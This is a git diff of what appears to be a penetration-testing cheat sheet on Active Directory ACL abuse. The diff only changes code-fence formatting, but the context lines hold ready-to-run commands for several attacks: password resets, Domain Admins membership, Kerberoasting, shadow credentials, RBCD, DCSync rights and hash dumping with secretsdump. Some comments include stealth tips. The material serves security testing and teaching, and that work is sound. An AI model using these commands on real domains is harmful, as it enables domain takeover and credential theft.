@@ -7,7 +7,7 @@ Active Directory objects have Access Control Lists that define who can read or m
 
 Start with BloodHound's graph, then sweep with PowerView and bloodyAD to catch what BloodHound misses on granular attributes.
 
-```bash
+```bash wrap
 # BloodHound: graph query
 # "Find Principals with Dangerous Rights" → shows GenericAll, WriteDACL, etc.
 # On owned nodes: right-click → "Outbound Object Control"
@@ -18,7 +18,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype U
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype COMPUTER
 ```
 
-```powershell
+```powershell wrap
 # PowerView: find all interesting ACEs
 Import-Module .\PowerView.ps1
 
@@ -56,7 +56,7 @@ Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Obje
 
 Full control over the object: three viable exploitation paths depending on what's noisiest or most reliable.
 
-```bash
+```bash wrap
 # Option 1: Password reset (loudest, triggers password change event)
 net rpc password $TARGET 'NewPass123!' -U $DOMAIN/$USER%$PASSWORD -S $DC_IP
 
@@ -66,7 +66,7 @@ GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP -request-user $TARGET
 Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
 ```
 
-```bash
+```bash wrap
 # Option 3: Shadow Credentials (stealthiest: no password change)
 pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip $IP
 certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD -account $TARGET -dc-ip $IP
@@ -76,7 +76,7 @@ certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD -account $TARGET -dc-ip $IP
 
 Add any account to the group directly: domain admin group membership being the obvious endgame.
 
-```powershell
+```powershell wrap
 # PowerView
 Add-DomainGroupMember -Identity "Domain Admins" -Members "$USER"
 
@@ -84,7 +84,7 @@ Add-DomainGroupMember -Identity "Domain Admins" -Members "$USER"
 net group "Domain Admins" $USER /add /domain
 ```
 
-```bash
+```bash wrap
 # bloodyAD from Linux
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST add groupMember "Domain Admins" $USER
 ```
@@ -93,7 +93,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST add groupMember "Domai
 
 Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer to configure Resource-Based Constrained Delegation. Full attack chain is in [Delegation → RBCD](./delegation#rbcd-resource-based-constrained-delegation).
 
-```bash
+```bash wrap
 # bloodyAD: set RBCD attribute on target computer
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   set object TARGET$ msDS-AllowedToActOnBehalfOfOtherIdentity -v 'ATTACKER_COMPUTER$'
@@ -103,20 +103,20 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 Can't reset the password directly, but can modify writable attributes: SPN for Kerberoasting or msDS-KeyCredentialLink for shadow creds.
 
-```powershell
+```powershell wrap
 # Targeted Kerberoast via SPN manipulation
 Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
 ```
 
-```bash
+```bash wrap
 GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP -request-user $TARGET
 ```
 
-```powershell
+```powershell wrap
 Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
 ```
 
-```bash
+```bash wrap
 # Shadow Credentials via msDS-KeyCredentialLink
 pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip $IP
 ```
@@ -125,7 +125,7 @@ pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip
 
 Same as GenericAll on Computer: set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target.
 
-```bash
+```bash wrap
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   set object TARGET$ msDS-AllowedToActOnBehalfOfOtherIdentity -v 'ATTACKER_COMPUTER$'
 ```
@@ -134,7 +134,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 Rewrite the DACL on the target object: grant yourself GenericAll or DCSync rights and escalate from there.
 
-```bash
+```bash wrap
 # Grant GenericAll on a user
 dacledit.py -action write -rights FullControl \
   -principal $USER -target $TARGET \
@@ -149,7 +149,7 @@ dacledit.py -action write -rights DCSync \
 secretsdump.py $DOMAIN/$USER:$PASSWORD@$DC_IP
 ```
 
-```powershell
+```powershell wrap
 # PowerView alternative
 Add-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
 Add-DomainObjectAcl -TargetIdentity "DC=$DOMAIN,DC=local" -PrincipalIdentity $USER -Rights DCSync
@@ -159,7 +159,7 @@ Add-DomainObjectAcl -TargetIdentity "DC=$DOMAIN,DC=local" -PrincipalIdentity $US
 
 Take ownership of the object first, then use that ownership to grant yourself WriteDACL: from there, escalate as above.
 
-```powershell
+```powershell wrap
 # Step 1: Take ownership
 Set-DomainObjectOwner -Identity $TARGET -OwnerIdentity $USER
 
@@ -174,7 +174,7 @@ Add-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
 
 Reset the target user's password without knowing the current one: useful when you need access to the account but don't want to enumerate further.
 
-```bash
+```bash wrap
 # Linux: net rpc
 net rpc password $TARGET 'NewPass123!' -U $DOMAIN/$USER%$PASSWORD -S $DC_IP
 
@@ -182,7 +182,7 @@ net rpc password $TARGET 'NewPass123!' -U $DOMAIN/$USER%$PASSWORD -S $DC_IP
 changepasswd.py $DOMAIN/$TARGET@$DC_IP -newpass 'NewPass123!' -newhashes :
 ```
 
-```powershell
+```powershell wrap
 # PowerView
 $newpass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity $TARGET -AccountPassword $newpass
@@ -196,7 +196,7 @@ setuserinfo2 $TARGET 23 'NewPass123!'
 
 Add a certificate key credential to the target account: authenticates via PKINIT without changing the password, leaving no obvious event log trail.
 
-```bash
+```bash wrap
 # pywhisker: add shadow credential
 pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip $IP
 # Outputs: PFX file path + PFX password
@@ -209,7 +209,7 @@ getTGT.py $DOMAIN/$TARGET -pfx-base64 $B64 -dc-ip $IP
 export KRB5CCNAME=$TARGET.ccache
 ```
 
-```powershell
+```powershell wrap
 # Whisker (Windows)
 .\Whisker.exe add /target:$TARGET /domain:$DOMAIN /dc:$DC_HOST
 # Outputs: Rubeus command to authenticate with the generated certificate
